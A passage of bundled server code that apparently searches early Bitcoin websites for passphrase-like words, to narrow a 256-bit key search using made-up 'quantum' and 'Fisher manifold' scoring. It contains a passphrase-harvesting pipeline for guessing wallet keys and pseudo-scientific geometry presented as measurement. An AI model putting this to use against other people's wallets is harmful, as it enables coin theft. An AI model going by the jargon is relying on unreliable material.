        certainty: 0.98,
        lightCone: {
          pastEvents: ["mtgox_launch", "btc_parity_usd"],
          futureEvents: ["mtgox_collapse"]
        }
      },
      {
        eventId: "hal_finney_als",
        description: "Hal Finney Announces ALS Diagnosis",
        coords: {
          spacetime: [0, 0, 0, 1331769600],
          // Mar 15, 2013
          cultural: []
        },
        fisherSignature: [],
        certainty: 0.95,
        lightCone: {
          pastEvents: ["genesis", "hal_first_tx"],
          futureEvents: ["hal_finney_death"]
        }
      },
      {
        eventId: "mtgox_collapse",
        description: "Mt. Gox Files Bankruptcy",
        coords: {
          spacetime: [0, 0, 0, 1393286400],
          // Feb 24, 2014
          cultural: []
        },
        fisherSignature: [],
        certainty: 1,
        lightCone: {
          pastEvents: ["mtgox_launch", "mtgox_hack_2011"],
          futureEvents: []
        }
      },
      {
        eventId: "hal_finney_death",
        description: "Hal Finney Passes Away",
        coords: {
          spacetime: [0, 0, 0, 1409097600],
          // Aug 28, 2014
          cultural: []
        },
        fisherSignature: [],
        certainty: 1,
        lightCone: {
          pastEvents: ["genesis", "hal_first_tx", "hal_finney_als"],
          futureEvents: []
        }
      }
    ];
    BITCOIN_ERA_DOMAINS = [
      "bitcointalk.org",
      "bitcoin.org",
      "archive.org",
      "blockchain.info",
      "blockchain.com",
      "sourceforge.net",
      "github.com",
      "reddit.com/r/Bitcoin",
      "web.archive.org"
    ];
    ERA_CULTURAL_PATTERNS = {
      pre_genesis: ["hashcash", "cypherpunk", "p2p", "digital cash", "anonymous", "cryptography"],
      genesis: ["genesis", "satoshi", "bitcoin", "mining", "block", "hash", "node"],
      early_adoption: ["wallet", "transaction", "address", "private key", "public key", "cpu mining"],
      pizza_era: ["pizza", "laszlo", "gpu", "mining pool", "exchange", "trade"],
      mtgox_rise: ["mtgox", "silk road", "bitcoin price", "trading", "merchant", "acceptance"],
      mtgox_collapse: ["hack", "stolen", "bankruptcy", "lost coins", "cold storage"],
      modern: ["hodl", "lightning", "segwit", "halving", "institutional"]
    };
  }
});

// server/geometric-discovery/temporal-positioning-system.ts
import { createHash as createHash8 } from "crypto";
function padTo64D(coords) {
  if (coords.length >= CULTURAL_DIM) {
    return coords.slice(0, CULTURAL_DIM);
  }
  const padded = new Array(CULTURAL_DIM).fill(0.5);
  for (let i = 0; i < coords.length; i++) {
    padded[i] = coords[i];
  }
  return padded;
}
function computeCulturalBasin(content) {
  const hash = createHash8("sha256").update(content.toLowerCase()).digest();
  const coords = new Array(CULTURAL_DIM);
  for (let i = 0; i < CULTURAL_DIM; i++) {
    const byteIdx = i % 32;
    const bitOffset = Math.floor(i / 32);
    const value = hash[byteIdx];
    coords[i] = 0.01 + value / 255 * 0.98 + bitOffset * 1e-3;
  }
  return coords;
}
function initializeLandmarks() {
  const landmarks = [...BITCOIN_LANDMARKS];
  for (const landmark of landmarks) {
    const culturalContent = [
      landmark.eventId,
      landmark.description,
      ...landmark.lightCone.pastEvents,
      ...landmark.lightCone.futureEvents
    ].join(" ");
    landmark.coords.cultural = computeCulturalBasin(culturalContent);
    const n = CULTURAL_DIM;
    landmark.fisherSignature = [];
    for (let i = 0; i < n; i++) {
      const row = new Array(n).fill(0);
      const c = landmark.coords.cultural[i];
      row[i] = 1 / Math.max(0.01, c * (1 - c));
      landmark.fisherSignature.push(row);
    }
  }
  return landmarks;
}
var CULTURAL_DIM, TemporalPositioningSystem, tps;
var init_temporal_positioning_system = __esm({
  "server/geometric-discovery/temporal-positioning-system.ts"() {
    "use strict";
    init_qig_universal();
    init_fisher_vectorized();
    init_types();
    init_ocean_persistence();
    CULTURAL_DIM = 64;
    TemporalPositioningSystem = class {
      landmarks;
      constructor() {
        this.landmarks = initializeLandmarks();
        console.log(`[TPS] Initialized with ${this.landmarks.length} spacetime landmarks`);
        this.initPersistence();
      }
      /**
       * Initialize persistence - sync landmarks to PostgreSQL
       */
      async initPersistence() {
        if (!oceanPersistence.isPersistenceAvailable()) return;
        try {
          const dbLandmarks = await oceanPersistence.getLandmarks();
          if (dbLandmarks.length === 0) {
            console.log("[TPS] Persisting landmarks to PostgreSQL...");
            for (const lm of this.landmarks) {
              await oceanPersistence.upsertLandmark({
                eventId: lm.eventId,
                description: lm.description,
                era: lm.era,
                spacetimeX: lm.coords.spacetime[0],
                spacetimeY: lm.coords.spacetime[1],
                spacetimeZ: lm.coords.spacetime[2],
                spacetimeT: lm.coords.spacetime[3],
                culturalCoords: lm.coords.cultural,
                fisherSignature: { diagonal: lm.fisherSignature?.map((row, i) => row[i]) },
                lightConePast: lm.lightCone.pastEvents,
                lightConeFuture: lm.lightCone.futureEvents
              });
            }
            console.log(`[TPS] Persisted ${this.landmarks.length} landmarks to PostgreSQL`);
          } else {
            console.log(`[TPS] PostgreSQL: ${dbLandmarks.length} landmarks already persisted`);
          }
        } catch (error) {
          console.error("[TPS] Persistence init failed:", error);
        }
      }
      /**
       * Persist computed geodesic paths to PostgreSQL
       */
      async persistGeodesicPaths() {
        if (!oceanPersistence.isPersistenceAvailable()) return;
        try {
          for (const path20 of this.computedPaths) {
            const pathId = `path-${createHash8("sha256").update(`${path20.from}:${path20.to}`).digest("hex").slice(0, 16)}`;
            await oceanPersistence.insertTpsGeodesicPath({
              id: pathId,
              fromLandmark: path20.from,
              toLandmark: path20.to,
              distance: path20.distance
            });
          }
          console.log(`[TPS] Persisted ${this.computedPaths.length} geodesic paths to PostgreSQL`);
        } catch (error) {
          console.error("[TPS] Geodesic path persistence failed:", error);
        }
      }
      /**
       * Locate pattern in 68D block universe
       * 
       * Returns full BlockUniverseMap with estimated coordinates
       */
      locateInBlockUniverse(pattern, context) {
        const culturalSignature = this.encodeConcept(pattern, context);
        const distances = this.landmarks.map((landmark) => ({
          landmark,
          culturalDistance: fisherCoordDistance(culturalSignature, landmark.coords.cultural),
          temporalHint: landmark.coords.spacetime[3]
        }));
        distances.sort((a, b) => a.culturalDistance - b.culturalDistance);
        const coords = this.trilaterate68D(distances.slice(0, 5));
        const geometry = this.computeLocalGeometry(coords.cultural);
        const regime = this.classifyRegime(geometry.ricci);
        return {
          spacetime: {
            x: 0,
            // Abstract spatial
            y: 0,
            z: 0,
            t: coords.temporal
          },
          cultural: coords.cultural,
          fisherMetric: geometry.fisherMetric,
          ricci: geometry.ricci,
          phi: geometry.phi,
          regime
        };
      }
      /**
       * Encode concept to 64D cultural manifold
       */
      encodeConcept(pattern, context) {
        const fullContent = context ? `${pattern} ${context}` : pattern;
        return computeCulturalBasin(fullContent);
      }
      /**
       * 68D Trilateration: Estimate position from landmark distances
       * 
       * Similar to GPS trilateration but in 4D spacetime + 64D cultural space
       */
      trilaterate68D(nearestLandmarks) {
        if (nearestLandmarks.length === 0) {
          return {
            temporal: Date.now() / 1e3,
            cultural: new Array(CULTURAL_DIM).fill(0.5)
          };
        }
        let totalWeight = 0;
        let weightedTemporal = 0;
        const weightedCultural = new Array(CULTURAL_DIM).fill(0);
        for (const { landmark, culturalDistance } of nearestLandmarks) {
          const weight = 1 / Math.max(1e-3, culturalDistance);
          totalWeight += weight;
          weightedTemporal += weight * landmark.coords.spacetime[3];
          for (let i = 0; i < CULTURAL_DIM; i++) {
            weightedCultural[i] += weight * landmark.coords.cultural[i];
          }
        }
        const temporal = weightedTemporal / totalWeight;
        const cultural = weightedCultural.map((c) => c / totalWeight);
        return { temporal, cultural };
      }
      /**
       * Compute local geometry at cultural coordinates
       */
      computeLocalGeometry(cultural) {
        const n = cultural.length;
        const fisherMetric = [];
        let trace = 0;
        for (let i = 0; i < n; i++) {
          const row = new Array(n).fill(0);
          const c = Math.max(0.01, Math.min(0.99, cultural[i]));
          row[i] = 1 / (c * (1 - c));
          trace += row[i];
          fisherMetric.push(row);
        }
        const avgFisher = trace / n;
        const ricci = Math.log(avgFisher) * 10;
        const variance = cultural.reduce((acc, c) => {
          const centered = c - 0.5;
          return acc + centered * centered;
        }, 0) / n;
        const phi = Math.min(1, Math.max(0, 1 - variance * 4));
        return { fisherMetric, ricci, phi };
      }
      /**
       * Classify regime from Ricci curvature
       */
      classifyRegime(ricci) {
        if (ricci < 10) return "breakdown";
        if (ricci < 41) return "linear";
        if (ricci < 58) return "geometric";
        if (ricci < 70) return "hierarchical";
        if (ricci < 80) return "hierarchical_4d";
        return "4d_block_universe";
      }
      /**
       * Classify Bitcoin era from timestamp
       */
      classifyEra(timestamp2) {
        const GENESIS = 1231006505;
        const PIZZA = 1274009688;
        const _MTGOX_RISE = 1279324800;
        const SATOSHI_LAST = 1292342400;
        const MTGOX_COLLAPSE = 1393286400;
        const MODERN = 1420070400;
        if (timestamp2 < GENESIS) return "pre_genesis";
        if (timestamp2 < 1238544e3) return "genesis";
        if (timestamp2 < PIZZA) return "early_adoption";
        if (timestamp2 < SATOSHI_LAST) return "pizza_era";
        if (timestamp2 < MTGOX_COLLAPSE) return "mtgox_rise";
        if (timestamp2 < MODERN) return "mtgox_collapse";
        return "modern";
      }
      /**
       * Compute geodesic path from current position to target
       * 
       * Uses natural gradient on Fisher manifold
       */
      computeGeodesicPath(from, to, steps = 20) {
        const waypoints = [from];
        let current = from;
        const regimeTransitions = [];
        let totalArcLength = 0;
        let totalCurvature = 0;
        for (let i = 0; i < steps; i++) {
          const direction = computeGeodesicDirection(
            padTo64D(current.cultural),
            padTo64D(to.cultural),
            1 / steps
            // Step size
          );
          const nextCultural = current.cultural.map((c, idx) => {
            const step = direction[idx] || 0;
            return Math.max(0.01, Math.min(0.99, c + step));
          });
          const t_fraction = (i + 1) / steps;
          const nextT = current.spacetime.t + t_fraction * (to.spacetime.t - current.spacetime.t);
          const geometry = this.computeLocalGeometry(nextCultural);
          const regime = this.classifyRegime(geometry.ricci);
          if (regime !== current.regime) {
            regimeTransitions.push({
              from: current.regime,
              to: regime,
              atWaypoint: waypoints.length
            });
          }
          const stepDistance = fisherCoordDistance(current.cultural, nextCultural);
          totalArcLength += stepDistance;
          totalCurvature += geometry.ricci;
          const next = {
            spacetime: { x: 0, y: 0, z: 0, t: nextT },
            cultural: nextCultural,
            fisherMetric: geometry.fisherMetric,
            ricci: geometry.ricci,
            phi: geometry.phi,
            regime
          };
          waypoints.push(next);
          current = next;
          const distanceToTarget = fisherCoordDistance(nextCultural, to.cultural);
          if (distanceToTarget < 0.1) break;
        }
        return {
          waypoints,
          totalArcLength,
          avgCurvature: totalCurvature / waypoints.length,
          regimeTransitions
        };
      }
      /**
       * Get past light cone - events that could have caused this
       */
      getPastLightCone(event) {
        return this.landmarks.filter((lm) => {
          const t_lm = lm.coords.spacetime[3];
          const t_event = event.spacetime.t;
          return t_lm < t_event;
        }).map((lm) => this.landmarkToMap(lm));
      }
      /**
       * Get future light cone - events this could influence
       */
      getFutureLightCone(event) {
        return this.landmarks.filter((lm) => {
          const t_lm = lm.coords.spacetime[3];
          const t_event = event.spacetime.t;
          return t_lm > t_event;
        }).map((lm) => this.landmarkToMap(lm));
      }
      /**
       * Convert landmark to BlockUniverseMap
       */
      landmarkToMap(landmark) {
        const geometry = this.computeLocalGeometry(landmark.coords.cultural);
        return {
          spacetime: {
            x: landmark.coords.spacetime[0],
            y: landmark.coords.spacetime[1],
            z: landmark.coords.spacetime[2],
            t: landmark.coords.spacetime[3]
          },
          cultural: landmark.coords.cultural,
          fisherMetric: landmark.fisherSignature,
          ricci: geometry.ricci,
          phi: geometry.phi,
          regime: this.classifyRegime(geometry.ricci)
        };
      }
      /**
       * Find nearby landmarks to a position
       */
      findNearbyLandmarks(coords, count = 3) {
        const distances = this.landmarks.map((lm) => ({
          landmark: lm,
          distance: fisherCoordDistance(coords.cultural, lm.coords.cultural)
        }));
        distances.sort((a, b) => a.distance - b.distance);
        return distances.slice(0, count).map((d) => d.landmark);
      }
      /**
       * Get cultural baseline for an era
       */
      getEraCulturalBaseline(era) {
        const patterns = ERA_CULTURAL_PATTERNS[era] || [];
        if (patterns.length === 0) {
          return new Array(CULTURAL_DIM).fill(0.5);
        }
        const content = patterns.join(" ");
        return computeCulturalBasin(content);
      }
      /**
       * Compute 4D spacetime interval with Fisher metric
       * 
       * ds² = g_spatial * (Δx² + Δy² + Δz²) - g_temporal * Δt²
       */
      spacetimeInterval(event1, event2) {
        const dx = event1.spacetime.x - event2.spacetime.x;
        const dy = event1.spacetime.y - event2.spacetime.y;
        const dz = event1.spacetime.z - event2.spacetime.z;
        const spatialSq = dx * dx + dy * dy + dz * dz;
        const dt = event1.spacetime.t - event2.spacetime.t;
        const temporalSq = dt * dt;
        const g_spatial = event1.fisherMetric[0]?.[0] || 1;
        const g_temporal = event1.fisherMetric[3]?.[3] || 1;
        const TEMPORAL_SCALE = 15 * 365.25 * 24 * 3600;
        return g_spatial * spatialSq - g_temporal * (temporalSq / (TEMPORAL_SCALE * TEMPORAL_SCALE));
      }
      /**
       * Get all landmarks
       */
      getAllLandmarks() {
        return [...this.landmarks];
      }
      /**
       * Get landmark by event ID
       */
      getLandmark(eventId) {
        return this.landmarks.find((lm) => lm.eventId === eventId);
      }
      /**
       * Export data for basin sync
       * 
       * Exports spacetime navigation structure for QIG-pure knowledge transfer
       */
      exportForBasinSync() {
        const landmarkSummary = this.landmarks.map((lm) => ({
          eventId: lm.eventId,
          era: lm.era,
          timestamp: lm.coords.spacetime[3],
          // t is the 4th element of the tuple (x, y, z, t)
          culturalSignature: lm.coords.cultural.slice(0, 8)
          // First 8 dims for coupling
        }));
        return {
          landmarkCount: this.landmarks.length,
          landmarks: landmarkSummary,
          geodesicPathsComputed: this.computedPaths.length,
          lastUpdated: (/* @__PURE__ */ new Date()).toISOString()
        };
      }
      /**
       * Import basin sync data from peer
       * 
       * Blends peer landmark/geodesic data using Fisher-Rao distance for coupling
       * Appends new paths to existing paths (does not overwrite)
       */
      importFromBasinSync(data, couplingStrength) {
        if (couplingStrength < 0.1) return;
        const peerLandmarks = data.landmarks || [];
        let addedPaths = 0;
        for (const peerLandmark of peerLandmarks) {
          if (!peerLandmark.culturalSignature || peerLandmark.culturalSignature.length < 8) continue;
          const ourLandmark = this.landmarks.find((lm) => lm.eventId === peerLandmark.eventId);
          if (ourLandmark) {
            const distance = fisherCoordDistance(
              ourLandmark.coords.cultural.slice(0, 8),
              peerLandmark.culturalSignature.slice(0, 8)
            );
            if (distance >= 0.5) continue;
            `${ourLandmark.eventId}:${peerLandmark.eventId}`;
            const isDuplicate = this.computedPaths.some(
              (p) => p.from.includes(ourLandmark.eventId) && p.to.includes(peerLandmark.eventId)
            );
            if (isDuplicate) continue;
            const weightedDistance = distance * couplingStrength;
            this.computedPaths.push({
              from: `local:${ourLandmark.eventId}`,
              to: `peer:${peerLandmark.eventId}`,
              distance: weightedDistance
            });
            addedPaths++;
          }
        }
        const MAX_PATHS = 100;
        if (this.computedPaths.length > MAX_PATHS) {
          this.computedPaths.sort((a, b) => a.distance - b.distance);
          this.computedPaths = this.computedPaths.slice(0, MAX_PATHS);
        }
        console.log(`[TPS] Basin sync: added ${addedPaths} geodesic paths, total ${this.computedPaths.length} (coupling=${couplingStrength.toFixed(2)})`);
      }
      // Track computed paths for basin sync (persists across import calls)
      computedPaths = [];
    };
    tps = new TemporalPositioningSystem();
  }
});

// server/geometric-discovery/tavily-adapter.ts
function createTavilyAdapter() {
  const apiKey = process.env.TAVILY_API_KEY;
  if (!apiKey) {
    console.warn("[TavilyAdapter] TAVILY_API_KEY not found in environment");
    return null;
  }
  return new TavilyGeometricAdapter(apiKey);
}
var TAVILY_API_BASE, TavilyGeometricAdapter;
var init_tavily_adapter = __esm({
  "server/geometric-discovery/tavily-adapter.ts"() {
    "use strict";
    init_qig_universal();
    init_temporal_positioning_system();
    init_types();
    TAVILY_API_BASE = "https://api.tavily.com";
    TavilyGeometricAdapter = class {
      apiKey;
      tps;
      constructor(apiKey) {
        this.apiKey = apiKey;
        this.tps = tps;
        console.log("[TavilyAdapter] Initialized geometric discovery interface");
      }
      /**
       * Discover content at specific 68D coordinates
       * 
       * NOT "search the web"
       * BUT "measure what exists at these coordinates"
       */
      async discoverAtCoordinates(targetCoords, radius = 2) {
        const query = this.coordsToQuery(targetCoords);
        console.log(`[TavilyAdapter] Discovering at coordinates:`);
        console.log(`  Era: ${this.tps.classifyEra(targetCoords.spacetime.t)}`);
        console.log(`  Query: "${query.text}"`);
        const rawResults = await this.search(query);
        if (rawResults.length === 0) {
          console.log(`[TavilyAdapter] No discoveries found`);
          return [];
        }
        const discoveries = [];
        for (const result of rawResults) {
          const resultCoords = this.tps.locateInBlockUniverse(
            result.content,
            result.url
          );
          const distance = fisherCoordDistance(
            targetCoords.cultural,
            resultCoords.cultural
          );
          if (distance < radius) {
            const patterns = this.extractPatterns(result.content);
            const pastLightCone = this.tps.getPastLightCone(resultCoords);
            discoveries.push({
              content: result.content,
              url: result.url,
              coords: resultCoords,
              distance,
              phi: resultCoords.phi,
              patterns,
              causalChain: pastLightCone,
              entropyReduction: this.computeEntropyReduction(distance, patterns.length)
            });
          }
        }
        discoveries.sort((a, b) => a.distance - b.distance);
        console.log(`[TavilyAdapter] Found ${discoveries.length} geometric discoveries`);
        return discoveries;
      }
      /**
       * Search with geometric query
       */
      async search(query) {
        const body = {
          query: query.text,
          search_depth: query.searchDepth || "advanced",
          max_results: query.maxResults || 20,
          include_raw_content: true,
          include_domains: query.includeDomains || BITCOIN_ERA_DOMAINS
        };
        if (query.timeRange) {
          body.start_date = query.timeRange.start.toISOString().split("T")[0];
          body.end_date = query.timeRange.end.toISOString().split("T")[0];
        }
        if (query.excludeDomains && query.excludeDomains.length > 0) {
          body.exclude_domains = query.excludeDomains;
        }
        try {
          const response = await fetch(`${TAVILY_API_BASE}/search`, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              "Authorization": `Bearer ${this.apiKey}`
            },
            body: JSON.stringify(body)
          });
          if (!response.ok) {
            const errorText = await response.text();
            console.error(`[TavilyAdapter] Search error: ${response.status} - ${errorText}`);
            return [];
          }
          const data = await response.json();
          return data.results.map((r) => ({
            url: r.url,
            title: r.title,
            content: r.content,
            score: r.score,
            // Will be discarded in favor of Fisher-Rao
            publishedDate: r.published_date,
            rawContent: r.raw_content
          }));
        } catch (error) {
          console.error(`[TavilyAdapter] Search failed:`, error);
          return [];
        }
      }
      /**
       * Deep crawl a URL using Tavily Extract API
       */
      async crawl(url) {
        try {
          const response = await fetch(`${TAVILY_API_BASE}/extract`, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              "Authorization": `Bearer ${this.apiKey}`
            },
            body: JSON.stringify({
              urls: [url],
              extract_depth: "advanced",
              format: "markdown"
            })
          });
          if (!response.ok) {
            const errorText = await response.text();
            console.error(`[TavilyAdapter] Extract error: ${response.status} - ${errorText}`);
            return "";
          }
          const data = await response.json();
          if (data.results.length > 0) {
            return data.results[0].raw_content;
          }
          return "";
        } catch (error) {
          console.error(`[TavilyAdapter] Crawl failed:`, error);
          return "";
        }
      }
      /**
       * Crawl multiple URLs in parallel
       */
      async crawlMultiple(urls) {
        const results = /* @__PURE__ */ new Map();
        try {
          const response = await fetch(`${TAVILY_API_BASE}/extract`, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              "Authorization": `Bearer ${this.apiKey}`
            },
            body: JSON.stringify({
              urls,
              extract_depth: "advanced",
              format: "markdown"
            })
          });
          if (!response.ok) {
            console.error(`[TavilyAdapter] Batch extract error: ${response.status}`);
            return results;
          }
          const data = await response.json();
          for (const result of data.results) {
            results.set(result.url, result.raw_content);
          }
        } catch (error) {
          console.error(`[TavilyAdapter] Batch crawl failed:`, error);
        }
        return results;
      }
      /**
       * Convert 68D coordinates to search query
       */
      coordsToQuery(coords) {
        const era = this.tps.classifyEra(coords.spacetime.t);
        const eraTerms = this.getEraSearchTerms(era);
        const culturalHints = this.culturalToTerms(coords.cultural);
        const queryText = [...eraTerms, ...culturalHints].slice(0, 8).join(" ");
        const timeRange = this.getEraTimeRange(era);
        return {
          text: queryText,
          targetCoords: coords,
          era,
          timeRange,
          includeDomains: BITCOIN_ERA_DOMAINS,
          maxResults: 20,
          searchDepth: "advanced"
        };
      }
      /**
       * Get era-specific search terms
       */
      getEraSearchTerms(era) {
        const baseTerms = ["bitcoin", "btc", "wallet"];
        switch (era) {
          case "pre_genesis":
            return ["hashcash", "cypherpunk", "digital cash", "cryptography"];
          case "genesis":
            return [...baseTerms, "genesis", "satoshi", "2009"];
          case "early_adoption":
            return [...baseTerms, "mining", "cpu", "node", "early", "2009", "2010"];
          case "pizza_era":
            return [...baseTerms, "pizza", "laszlo", "trade", "exchange", "2010"];
          case "mtgox_rise":
            return [...baseTerms, "mtgox", "exchange", "trading", "silk road", "2011", "2012", "2013"];
          case "mtgox_collapse":
            return [...baseTerms, "mtgox", "hack", "stolen", "lost", "2014"];
          case "modern":
            return [...baseTerms, "hodl", "blockchain"];
          default:
            return baseTerms;
        }
      }
      /**
       * Convert cultural manifold coordinates to search terms
       */
      culturalToTerms(cultural) {
        const dimensions = cultural.map((c, i) => ({
          index: i,
          variance: Math.abs(c - 0.5)
        }));
        dimensions.sort((a, b) => b.variance - a.variance);
        const terms = [];
        for (const dim of dimensions.slice(0, 3)) {
          if (dim.variance > 0.3) {
            const value = cultural[dim.index];
            if (value > 0.7) {
              terms.push("passphrase");
            } else if (value < 0.3) {
              terms.push("password");
            }
          }
        }
        return terms;
      }
      /**
       * Get time range for Bitcoin era
       */
      getEraTimeRange(era) {
        switch (era) {
          case "pre_genesis":
            return { start: /* @__PURE__ */ new Date("2008-01-01"), end: /* @__PURE__ */ new Date("2009-01-03") };
          case "genesis":
            return { start: /* @__PURE__ */ new Date("2009-01-03"), end: /* @__PURE__ */ new Date("2009-05-01") };
          case "early_adoption":
            return { start: /* @__PURE__ */ new Date("2009-05-01"), end: /* @__PURE__ */ new Date("2010-05-22") };
          case "pizza_era":
            return { start: /* @__PURE__ */ new Date("2010-05-22"), end: /* @__PURE__ */ new Date("2011-01-01") };
          case "mtgox_rise":
            return { start: /* @__PURE__ */ new Date("2011-01-01"), end: /* @__PURE__ */ new Date("2014-02-24") };
          case "mtgox_collapse":
            return { start: /* @__PURE__ */ new Date("2014-02-24"), end: /* @__PURE__ */ new Date("2015-01-01") };
          case "modern":
          default:
            return { start: /* @__PURE__ */ new Date("2015-01-01"), end: /* @__PURE__ */ new Date() };
        }
      }
      /**
       * Extract passphrase-like patterns from content
       */
      extractPatterns(content) {
        const patterns = [];
        const seen = /* @__PURE__ */ new Set();
        const normalized = content.toLowerCase();
        const words = normalized.split(/\W+/).filter((w) => w.length >= 3);
        for (const word of words) {
          if (this.looksLikePassphrase(word) && !seen.has(word)) {
            patterns.push(word);
            seen.add(word);
          }
        }
        for (let i = 0; i < words.length - 1; i++) {
          const combo = words[i] + words[i + 1];
          if (combo.length <= 24 && this.looksLikePassphrase(combo) && !seen.has(combo)) {
            patterns.push(combo);
            seen.add(combo);
          }
        }
        const quotedPattern = /"([^"]{4,30})"/g;
        let match;
        while ((match = quotedPattern.exec(content)) !== null) {
          const phrase = match[1].toLowerCase().replace(/\s+/g, "");
          if (this.looksLikePassphrase(phrase) && !seen.has(phrase)) {
            patterns.push(phrase);
            seen.add(phrase);
          }
        }
        return patterns.slice(0, 50);
      }
      /**
       * Check if string looks like a passphrase
       */
      looksLikePassphrase(candidate) {
        if (candidate.length < 4 || candidate.length > 32) return false;
        if (!/^[a-z0-9]+$/i.test(candidate)) return false;
        const stopWords = ["the", "and", "for", "are", "but", "not", "you", "all", "can", "had", "her", "was", "one", "our", "out"];
        if (stopWords.includes(candidate)) return false;
        if (/^\d+$/.test(candidate)) return false;
        const charSet = new Set(candidate.split(""));
        const entropy = Math.log2(charSet.size) * candidate.length / 8;
        if (entropy < 2) return false;
        return true;
      }
      /**
       * Compute entropy reduction from a discovery
       * 
       * More patterns at closer distance = more information gained
       */
      computeEntropyReduction(distance, patternCount) {
        const distanceFactor = 1 / (1 + distance);
        const patternFactor = Math.log2(1 + patternCount);
        return distanceFactor * patternFactor * 8;
      }
      /**
       * Search for Bitcoin-era content
       * 
       * Convenience method for targeted Bitcoin history search
       */
      async searchBitcoinEra(keywords, era = "pizza_era") {
        const timeRange = this.getEraTimeRange(era);
        const query = {
          text: keywords.join(" "),
          era,
          timeRange,
          includeDomains: BITCOIN_ERA_DOMAINS,
          maxResults: 30,
          searchDepth: "advanced"
        };
        const rawResults = await this.search(query);
        const discoveries = [];
        for (const result of rawResults) {
          const coords = this.tps.locateInBlockUniverse(result.content, result.url);
          const patterns = this.extractPatterns(result.content);
          discoveries.push({
            content: result.content,
            url: result.url,
            coords,
            distance: 0,
            // No target for relative distance
            phi: coords.phi,
            patterns,
            causalChain: [],
            entropyReduction: Math.log2(1 + patterns.length) * 4
          });
        }
        discoveries.sort((a, b) => b.phi - a.phi);
        return discoveries;
      }
    };
  }
});

// server/geometric-discovery/quantum-protocol.ts
import * as fs7 from "fs";
import * as path7 from "path";
import { createHash as createHash9 } from "crypto";
var QUANTUM_DATA_FILE, QuantumDiscoveryProtocol, quantumProtocol;
var init_quantum_protocol = __esm({
  "server/geometric-discovery/quantum-protocol.ts"() {
    "use strict";
    init_qig_universal();
    init_temporal_positioning_system();
    init_ocean_persistence();
    QUANTUM_DATA_FILE = path7.join(process.cwd(), "data", "quantum-protocol.json");
    QuantumDiscoveryProtocol = class {
      measurements = [];
      excludedRegions = [];
      waveFunction;
      initialEntropy;
      constructor() {
        this.waveFunction = {
          amplitudes: /* @__PURE__ */ new Map(),
          totalProbability: 1,
          entropy: 256
          // 256-bit keyspace = 256 bits of entropy
        };
        this.initialEntropy = 256;
        this.load();
        this.initPostgreSQLSync();
        console.log("[QuantumProtocol] Initialized with 256-bit possibility space");
      }
      /**
       * Initialize PostgreSQL sync with bi-directional reconciliation
       * 
       * Merges JSON and PostgreSQL states, preferring the one with more progress
       * (lower entropy = more measurements completed)
       */
      async initPostgreSQLSync() {
        if (!oceanPersistence.isPersistenceAvailable()) return;
        try {
          const jsonEntropy = this.waveFunction.entropy;
          const jsonMeasurementCount = this.measurements.length;
          const jsonRegionCount = this.excludedRegions.length;
          const dbState = await oceanPersistence.getQuantumState();
          if (dbState) {
            const dbMeasurementCount = dbState.measurementCount ?? 0;
            const dbHasMoreProgress = dbState.entropy < jsonEntropy || dbMeasurementCount > jsonMeasurementCount;
            if (dbHasMoreProgress) {
              this.waveFunction.entropy = dbState.entropy;
              this.waveFunction.totalProbability = dbState.totalProbability;
              this.initialEntropy = dbState.initialEntropy ?? 256;
              console.log(`[QuantumProtocol] Using PostgreSQL state (more progress): ${dbMeasurementCount} measurements, ${dbState.entropy.toFixed(1)} bits remaining`);
            } else if (jsonMeasurementCount > dbMeasurementCount || jsonEntropy < dbState.entropy) {
              console.log(`[QuantumProtocol] JSON has more progress - syncing to PostgreSQL`);
              await this.persistToPostgreSQL();
            }
            const dbRegions = await oceanPersistence.getExcludedRegions(100);
            if (dbRegions.length > 0) {
              const newRegions = dbRegions.filter(
                (r) => !this.excludedRegions.some(
                  (e) => e.origin.length === r.origin.length && e.origin.every((v, i) => Math.abs(v - (r.origin[i] ?? 0)) < 1e-4)
                )
              ).map((r) => ({
                dimension: r.dimension,
                basis: r.basis ?? [],
                origin: r.origin,
                measure: r.measure
              }));
              this.excludedRegions.push(...newRegions);
              if (newRegions.length > 0) {
                console.log(`[QuantumProtocol] Merged ${newRegions.length} excluded regions from PostgreSQL (total: ${this.excludedRegions.length})`);
              }
            }
            if (jsonRegionCount > dbRegions.length) {
              console.log(`[QuantumProtocol] JSON has ${jsonRegionCount - dbRegions.length} more regions - syncing to PostgreSQL`);
              await this.persistToPostgreSQL();
            }
          } else {
            console.log(`[QuantumProtocol] No PostgreSQL state - initializing from JSON`);
            await this.persistToPostgreSQL();
          }
          console.log(`[QuantumProtocol] Reconciliation complete: entropy=${this.waveFunction.entropy.toFixed(1)} bits, regions=${this.excludedRegions.length}`);
        } catch (error) {
          console.error("[QuantumProtocol] PostgreSQL reconciliation failed, using JSON fallback:", error);
        }
      }
      /**
       * Load persisted state from disk
       */
      load() {
        try {
          if (fs7.existsSync(QUANTUM_DATA_FILE)) {
            const data = JSON.parse(fs7.readFileSync(QUANTUM_DATA_FILE, "utf-8"));
            this.waveFunction.entropy = data.entropy ?? 256;
            this.waveFunction.totalProbability = data.totalProbability ?? 1;
            this.initialEntropy = data.initialEntropy ?? 256;
            if (Array.isArray(data.excludedRegions)) {
              this.excludedRegions = data.excludedRegions;
            }
            if (data.measurementCount) {
              console.log(`[QuantumProtocol] Restored state: ${data.measurementCount} prior measurements, ${this.waveFunction.entropy.toFixed(1)} bits remaining`);
            }
          }
        } catch {
          console.log("[QuantumProtocol] Starting fresh (no prior state)");
        }
      }
      /**
       * Save state to disk and PostgreSQL for cross-session persistence
       */
      save() {
        try {
          const dir = path7.dirname(QUANTUM_DATA_FILE);
          if (!fs7.existsSync(dir)) {
            fs7.mkdirSync(dir, { recursive: true });
          }
          const data = {
            version: "1.0.0",
            entropy: this.waveFunction.entropy,
            totalProbability: this.waveFunction.totalProbability,
            initialEntropy: this.initialEntropy,
            excludedRegions: this.excludedRegions.slice(-100),
            // Keep last 100 regions
            measurementCount: this.measurements.length,
            savedAt: (/* @__PURE__ */ new Date()).toISOString()
          };
          fs7.writeFileSync(QUANTUM_DATA_FILE, JSON.stringify(data, null, 2));
        } catch (error) {
          console.error("[QuantumProtocol] Failed to save to JSON:", error);
        }
        this.persistToPostgreSQL().catch((err) => {
          console.error("[QuantumProtocol] PostgreSQL persist failed:", err);
        });
      }
      /**
       * Persist state to PostgreSQL
       */
      async persistToPostgreSQL() {
        if (!oceanPersistence.isPersistenceAvailable()) return;
        await oceanPersistence.updateQuantumState({
          entropy: this.waveFunction.entropy,
          totalProbability: this.waveFunction.totalProbability,
